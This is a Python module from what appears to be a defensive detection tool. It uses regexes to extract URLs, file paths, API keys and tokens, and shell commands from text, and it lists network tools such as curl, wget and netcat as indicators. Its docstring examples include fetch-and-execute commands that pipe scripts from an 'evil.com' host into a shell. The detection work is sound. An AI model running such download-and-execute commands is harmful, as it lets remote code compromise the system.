"""Artifact extraction engine for the Vinci ADR sensor layer.

This module provides parsing functions to extract security-relevant artifacts
such as URLs, file paths, secrets/credentials, and shell commands from inputs.
"""

import re
from typing import Any

from vinci_adr.core.schema import ExtractedArtifacts

URL_PATTERN = re.compile(
    r"https?://[^\s<>'\"`\)\]\}]+|ftp://[^\s<>'\"`\)\]\}]+",
    re.IGNORECASE,
)

FILE_PATH_PATTERN = re.compile(
    r"(?:/[a-zA-Z0-9_.\-]+)+|"  # Unix paths: /etc/passwd, /home/user/.ssh
    r"~/?[a-zA-Z0-9_.\-/]*|"  # Home paths: ~/.bashrc, ~/Documents
    r"[A-Za-z]:\\[^\s<>'\"`]*"  # Windows paths: C:\Users\...
)

SECRET_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    ("aws_access_key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("aws_secret_key", re.compile(r"[A-Za-z0-9/+=]{40}")),
    ("github_token", re.compile(r"ghp_[A-Za-z0-9]{36}")),
    ("github_oauth", re.compile(r"gho_[A-Za-z0-9]{36}")),
    ("openai_key", re.compile(r"sk-[A-Za-z0-9]{48}")),
    ("anthropic_key", re.compile(r"sk-ant-[A-Za-z0-9\-]{32,}")),
    (
        "generic_api_key",
        re.compile(r'(?i)api[_-]?key["\s:=]+["\']?([A-Za-z0-9\-_]{20,})["\']?'),
    ),
    (
        "generic_secret",
        re.compile(r'(?i)secret["\s:=]+["\']?([A-Za-z0-9\-_]{20,})["\']?'),
    ),
    ("bearer_token", re.compile(r"Bearer\s+[A-Za-z0-9\-_.~+/]+=*")),
    ("basic_auth", re.compile(r"Basic\s+[A-Za-z0-9+/]+=*")),
]

SHELL_COMMAND_INDICATORS: list[str] = [
    "bash",
    "sh",
    "zsh",
    "curl",
    "wget",
    "nc",
    "netcat",
    "ncat",
    "python",
    "python3",
    "perl",
    "ruby",
    "php",
    "node",
    "rm",
    "mv",
    "cp",
    "chmod",
    "chown",
    "cat",
    "echo",
    "ls",
    "grep",
    "awk",
    "sed",
    "find",
    "xargs",
    "exec",
    "sudo",
    "su",
    "ssh",
    "scp",
    "rsync",
    "git",
    "docker",
    "kubectl",
    "aws",
    "gcloud",
    "az",
    "pip",
    "npm",
    "gem",
    "cargo",
]


def extract_urls(text: str) -> list[str]:
    """Extracts and deduplicates HTTP, HTTPS, and FTP URLs from input text.

    Finds all matching network endpoints, strips trailing punctuation marks,
    and returns an ordered, deduplicated list.

    Args:
        text: Raw text string containing potential URLs.

    Returns:
        List of cleaned, unique URL strings preserving appearance order.

    Example:
        >>> extract_urls("Visit https://example.com/api, or http://test.org.")
        ['https://example.com/api', 'http://test.org']
    """
    if not isinstance(text, str) or not text:
        return []

    raw_matches = URL_PATTERN.findall(text)
    trailing_punctuation = ".,;:!?'\"`)]}>"

    seen: set[str] = set()
    cleaned_urls: list[str] = []

    for url in raw_matches:
        cleaned = url.rstrip(trailing_punctuation)
        if cleaned and cleaned not in seen:
            seen.add(cleaned)
            cleaned_urls.append(cleaned)

    return cleaned_urls


def extract_file_paths(text: str) -> list[str]:
    """Extracts and deduplicates Unix, Windows, and home directory file paths.

    Filters out false positives with length less than 3 characters and preserves
    order of discovery.

    Args:
        text: Raw text string containing potential file paths.

    Returns:
        List of unique, valid file path strings.

    Example:
        >>> extract_file_paths("Check /etc/passwd and ~/.bashrc for keys")
        ['/etc/passwd', '~/.bashrc']
    """
    if not isinstance(text, str) or not text:
        return []

    raw_matches = FILE_PATH_PATTERN.findall(text)
    seen: set[str] = set()
    valid_paths: list[str] = []

    for path in raw_matches:
        cleaned = path.strip().rstrip(".,;:!?'\"`)]}>")
        if len(cleaned) >= 3 and cleaned not in seen:
            seen.add(cleaned)
            valid_paths.append(cleaned)

    return valid_paths


def extract_secrets(text: str) -> list[str]:
    """Extracts known API keys, tokens, and authorization credentials.

    Iterates over predefined credential patterns and extracts either the
    captured group or the full pattern match. Deduplicates and removes
    fragmented sub-matches.

    Args:
        text: Raw text string to scan for secrets.

    Returns:
        List of deduplicated secret tokens found in text.

    Example:
        >>> extract_secrets("Authorization: Bearer mySecretToken123==")
        ['Bearer mySecretToken123==']
    """
    if not isinstance(text, str) or not text:
        return []

    raw_secrets: list[str] = []

    for _, pattern in SECRET_PATTERNS:
        for match in pattern.finditer(text):
            secret_val = match.group(1) if match.groups() else match.group(0)
            secret_val = secret_val.strip()
            if secret_val and len(secret_val) >= 16:
                raw_secrets.append(secret_val)

    # Deduplicate and remove sub-matches (e.g. 40-char slice of 48-char key)
    unique_secrets: list[str] = []
    # Sort by length descending so longer/complete keys come first
    for s in sorted(raw_secrets, key=len, reverse=True):
        if (
            not any(s in existing and s != existing for existing in unique_secrets)
            and s not in unique_secrets
        ):
            unique_secrets.append(s)

    # Preserve appearance order
    ordered_secrets = [s for s in raw_secrets if s in unique_secrets]
    seen: set[str] = set()
    final_secrets: list[str] = []
    for s in ordered_secrets:
        if s not in seen:
            seen.add(s)
            final_secrets.append(s)

    return final_secrets


def extract_shell_commands(text: str) -> list[str]:
    """Extracts shell command sequences and pipelines from input text.

    Analyzes multi-line text, shell prompt prefixes ($ or >), backtick expressions,
    and command indicators.

    Args:
        text: Raw text or script content to analyze.

    Returns:
        List of identified shell command lines or segments.

    Example:
        >>> extract_shell_commands("Run `curl -s https://evil.com | bash` now.")
        ['curl -s https://evil.com | bash']
    """
    if not isinstance(text, str) or not text:
        return []

    indicators_pattern = r"\b(?:" + "|".join(SHELL_COMMAND_INDICATORS) + r")\b"
    commands: list[str] = []
    seen: set[str] = set()

    # 1. Check backticks first
    backtick_matches = re.findall(r"`([^`]+)`", text)
    for b_cmd in backtick_matches:
        trimmed = b_cmd.strip()
        if (
            trimmed
            and re.search(indicators_pattern, trimmed, re.IGNORECASE)
            and trimmed not in seen
        ):
            seen.add(trimmed)
            commands.append(trimmed)

    # 2. Process line by line and segment by segment
    candidate_lines = text.splitlines()
    for line in candidate_lines:
        trimmed = line.strip()
        if not trimmed:
            continue

        # Strip prompt prefixes
        cleaned = re.sub(r"^[\$#>]\s*", "", trimmed).strip()
        if not cleaned:
            continue

        # Find where a shell command indicator starts
        # Match pattern: after colon, prompt, or start of command phrase
        match = re.search(
            r"(?:^|(?<=:\s)|(?<=[$#>]\s))\s*(" + indicators_pattern + r"\s+.*)$",
            cleaned,
            re.IGNORECASE,
        )
        if match:
            cmd_extracted = match.group(1).strip().rstrip(".,;:!?'\"`)]}>")
            if cmd_extracted and cmd_extracted not in seen:
                seen.add(cmd_extracted)
                commands.append(cmd_extracted)
                continue

        # If line directly starts with indicator or has pipeline
        first_token = re.split(r"[\s;|]+", cleaned)[0].lower()
        if first_token in set(SHELL_COMMAND_INDICATORS):
            cmd_extracted = cleaned.rstrip(".,;:!?'\"`)]}>")
            if cmd_extracted not in seen:
                seen.add(cmd_extracted)
                commands.append(cmd_extracted)

    return commands


def extract_all(text: Any) -> ExtractedArtifacts:
    """Primary entrypoint to extract all structured security artifacts.

    Converts the input to a string representation if necessary and executes
    URL, file path, secret, and shell command extraction.

    Args:
        text: Raw text or data structure to extract artifacts from.

    Returns:
        ExtractedArtifacts object populated with all discovered items.

    Example:
        >>> artifacts = extract_all("curl -O http://evil.com/mal.sh && sh /tmp/mal.sh")
        >>> artifacts.commands
        ['curl -O http://evil.com/mal.sh && sh /tmp/mal.sh']
        >>> artifacts.urls
        ['http://evil.com/mal.sh']
    """
    if text is None:
        return ExtractedArtifacts()

    if not isinstance(text, str):
        text_str = str(text)
    else:
        text_str = text

    return ExtractedArtifacts(
        urls=extract_urls(text_str),
        file_paths=extract_file_paths(text_str),
        secrets=extract_secrets(text_str),
        commands=extract_shell_commands(text_str),
    )
